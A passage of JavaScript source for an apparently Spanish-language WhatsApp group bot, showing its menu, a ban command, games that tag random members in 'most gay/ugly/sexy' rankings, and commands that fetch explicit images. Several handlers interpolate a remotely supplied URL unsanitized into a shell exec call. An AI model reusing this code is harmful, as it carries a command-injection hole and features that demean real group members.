*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}besar @*
*╟ ❒ ${prefix}patear @*
*╟ ❒ ${prefix}abrazar @*
*╟ ❒ ${prefix}palmaditas @*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣ADMINS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}info*
*╟ ❒ ${prefix}ping*
*╟ ❒ ${prefix}notif*
*╟ ❒ ${prefix}todos*
*╟ ❒ ${prefix}tagall*
*╟ ❒ ${prefix}kick @*
*╟ ❒ ${prefix}chatlist*
*╟ ❒ ${prefix}getbio @*
*╟ ❒ ${prefix}linkgroup*
*╟ ❒ ${prefix}listadmin*
*╟ ❒ ${prefix}promote @*
*╟ ❒ ${prefix}antilink [1/0]*
*╟ ❒ ${prefix}hidetag (texto)*
*╟ ❒ ${prefix}antitrava [1/0]*
*╟ ❒ ${prefix}welcome [1/0]*
*╟ ❒ ${prefix}grupo [abrir/cerrar]*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NSFW*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}nfswmenu*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣GAMES*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}gay*
*╟ ❒ ${prefix}reto*
*╟ ❒ ${prefix}slot*
*╟ ❒ ${prefix}lesbi*
*╟ ❒ ${prefix}juego*
*╟ ❒ ${prefix}ruleta*
*╟ ❒ ${prefix}charlie*
*╟ ❒ ${prefix}verdad*
*╟ ❒ ${prefix}apostar*
*╟ ❒ ${prefix}rankfeo*
*╟ ❒ ${prefix}tictactoe*
*╟ ❒ ${prefix}rankgay*
*╟ ❒ ${prefix}ranklindo*
*╟ ❒ ${prefix}ranksexy*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣CREADOR*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}ice*
*╟ ❒ ${prefix}box*
*╟ ❒ ${prefix}love*
*╟ ❒ ${prefix}toxic*
*╟ ❒ ${prefix}love2*
*╟ ❒ ${prefix}blood*
*╟ ❒ ${prefix}luxury*
*╟ ❒ ${prefix}dance*
*╟ ❒ ${prefix}bokeh*
*╟ ❒ ${prefix}text3d*
*╟ ❒ ${prefix}blood2*
*╟ ❒ ${prefix}warrior*
*╟ ❒ ${prefix}codetxt*
*╟ ❒ ${prefix}express*
*╟ ❒ ${prefix}vampire*
*╟ ❒ ${prefix}blackbird*
*╟ ❒ ${prefix}halloween*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣OTROS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}perfil* ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}wame*
*╟ ❒ ${prefix}frases*
*╟ ❒ ${prefix}frases2*
*╟ ❒ ${prefix}piropos*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠ೋ━ೋ✧ೋ━ೋ┓*
*║        🌸Watame🌸*
*┗ೋ━ೋ✧ೋ━ೋ┛*`      
cnf.sendMessage(from, wew, image,{contextInfo: {forwardingScore : 0, isForwarded: false},sendEphemeral: true, caption:lzain})
     addFilter(from)
          break

case prefix+'start':
if (isBanned) return  reply(mess.banned)	     
if (!isRegistered) return reply(ind.noregis())
if (!isOwner) return reply(mess.only.ownerB)			  
reply(`*╭═┅╡🌸WATAME🌸╞┅═╮*\n*╟ ╳*\n*╟ ❒ Iniciando...!*\n*╟ ❒ Usa #menu para ver*\n        *el menú de opciones!*\n*╟ ╳*\n*┠ೋ━ೋ✧ೋ━ೋ┓*\n*║        ✨EN LINEA✨*\n*┗ೋ━ೋ✧ೋ━ೋ┛*`)
     addFilter(from)
          break
  
case prefix+'ban':
if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Por favor etiqueta!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')
const Bb = [`${body.slice(6)}`]
										ban.push(`${Bb}@s.whatsapp.net`)		
            fs.writeFileSync('./database/json/banned.json', JSON.stringify(ban))
reply(`El numero ${body.slice(4)} ah sido baneado ya no podra utilizarme`)
addFilter(from)
          break

case prefix+ 'ranklindo':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())
          	
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
          jds = []
          const YDDY = groupMembers
          const JSJ = groupMembers
          const TAAT = groupMembers
          const SG = YDDY[Math.floor(Math.random() * YDDY.length)]           
          const SOOD = JSJ[Math.floor(Math.random() * JSJ.length)]
          const HDH = TAAT[Math.floor(Math.random() * TAAT.length)]
          AJ = `●❯────────────────❮●\nTop de los más lindos del grupo \n@${SG.jid.split('@')[0]} \n😳\n@${SOOD.jid.split('@')[0]}\n😘\n@${HDH.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(SG.jid)
          jds.push(SOOD.jid)
          jds.push(HDH.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${AJ}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'rankgay':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())	
          
          tuh = fs.readFileSync(`./stik/gay.jpg`)
          jds = []
          const Z11 = groupMembers
          const U11 = groupMembers
          const T11 = groupMembers
          const F11 = Z11[Math.floor(Math.random() * Z11.length)]           
          const G22 = U11[Math.floor(Math.random() * U11.length)]
          const H33 = T11[Math.floor(Math.random() * T11.length)]
          D11 = `●❯────────────────❮●\nTop de los más gays del grupo 🌈\n@${F11.jid.split('@')[0]} \n🏳️‍🌈\n@${G22.jid.split('@')[0]}\n🏳️‍🌈\n@${H33.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(F11.jid)
          jds.push(G22.jid)
          jds.push(H33.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${D11}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'rankfeo':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())	
          
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
                    const YDDDY = groupMembers
          const JJSJ = groupMembers
          const TAAET = groupMembers
          const SSG = YDDDY[Math.floor(Math.random() * YDDDY.length)]           
          const SSOOD = JJSJ[Math.floor(Math.random() * JJSJ.length)]
          const HDDDH = TAAET[Math.floor(Math.random() * TAAET.length)]
          jds = []
          AJ = `●❯────────────────❮●\nTop de los mas feos del grupo\n@${SSG.jid.split('@')[0]} \n🥸\n@${SSOOD.jid.split('@')[0]}\n🤓\n@${HDDDH.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(SSG.jid)
          jds.push(SSOOD.jid)
          jds.push(HDDDH.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${AJ}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'ranksexy':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())
	
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
                    const Z111 = groupMembers
                              const U111 = groupMembers
          const T111 = groupMembers
          const F111 = Z111[Math.floor(Math.random() * Z111.length)]  
          const G222 = U111[Math.floor(Math.random() * U111.length)]
          const H333 = T111[Math.floor(Math.random() * T111.length)]          
          jds = []
          D11 = `●❯────────────────❮●\nTop de los mas sexis del grupo\n@${F111.jid.split('@')[0]} \n💃\n@${G222.jid.split('@')[0]}\n🕺\n@${H333.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(F111.jid)
          jds.push(G222.jid)
          jds.push(H333.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${D11}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+'trabajar':
           if (isBanned) return  reply(mess.banned)
           if (!isRegistered) return reply(ind.noregis())
           cnf.updatePresence(from, Presence.composing)                   			      		
           addKoinUser(sender, 200)
           reply(`❝ Trabajaste y Ganaste 200 Coins ❞`)
	addFilter(from)
          break

'Para volver a activar los comandos NSFW solo para admins utiliza: (if (!isNsfw) return reply(mess.nsfwoff))'

case prefix+'nsfwmenu':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
               cnf.sendMessage(from, nsfwmenu(prefix, sender), text, {quoted: mek})
            addFilter(from)
          break

case prefix+'idiomas':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
               cnf.sendMessage(from, idiomas(prefix, sender), text, {quoted: mek})
            addFilter(from)
          break
  
case prefix+'avatar':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
			anu = await axios.get('https://nekos.life/api/v2/img/avatar')
				avatars = await getBuffer(anu.data.url)
				cnf.sendMessage(from, avatars, image, {quoted: mek, caption: 'Linda foto no?' })
			addFilter(from)
          break
			    
case prefix+'antilink':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
if (!isGroup) return reply(`「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS`)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
					if (args.length < 1) return reply('Escribe 1 para activar')

					if (Number(args[0]) === 1) {

						if (isAntiLink) return reply('Ya está activo')

						antilink.push(from)

						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))

						reply('Activado correctamente✔️')

						cnf.sendMessage(from,`*🚫Antilink ha sido ativado, si envían enlaces serán eliminados del grupo🚫*`, text)

					} else if (Number(args[0]) === 0) {

						if (!isAntiLink) return reply('*Desactivado*')

						var ini = antilink.indexOf(from)

						antilink.splice(ini, 1)

						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))

						reply('Desactivar correctamente ✔️')

					} else {

						reply('Escribe 1 para activar o 0 para desactivar')

					}

					addFilter(from)
					break
 
case prefix+'anime':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
cnf.sendMessage(from,media,image,{quoted:mek,caption:'Aquí tienes 💕🦈'})
}
)
.catch((error) => {
console.log(error); 
}
)
});
addFilter(from)
break

case prefix+'pussy':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/pussy')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('error')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
reply('Aquí tienes 💕🦈')
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'pussyimage':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
pusiimg = await axios.get('https://nekos.life/api/v2/img/pussy_jpg')
bufpusy = await getBuffer(pusiimg.data.url)
cnf.sendMessage(from, bufpusy, MessageType.image, {quoted: mek})
reply('Aquí tienes 💕🦈')
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break

case prefix+'solo':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/solog')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('error')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
reply('Aquí tienes 💕🦈')
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'yuri':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yuriz = await axios.get('https://nekos.life/api/v2/img/yuri')
bupyuri = await getBuffer(yuriz.data.url)
cnf.sendMessage(from, bupyuri, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break

case prefix+'futanari':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
futa1 = await axios.get('https://nekos.life/api/v2/img/futanari')
futa2 = await getBuffer(futa1.data.url)
cnf.sendMessage(from, futa2, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'oppai':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/boobs')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('E-error ⊙﹏⊙')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
reply('Aquí tienes 💕🦈')
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'anal':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/anal')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('E-error ⊙﹏⊙')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
reply('Aquí tienes 💕🦈')
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'pwankg':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/pwankg')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('E-error ⊙﹏⊙')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
reply('Aquí tienes 💕🦈')
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'ero':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
eronz = await axios.get('https://nekos.life/api/v2/img/eron')
buferon = await getBuffer(eronz.data.url)
cnf.sendMessage(from, buferon, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'cum':
if (isBanned) return  reply(mess.banned)        
if (!isRegistered) return reply(ind.noregis())	
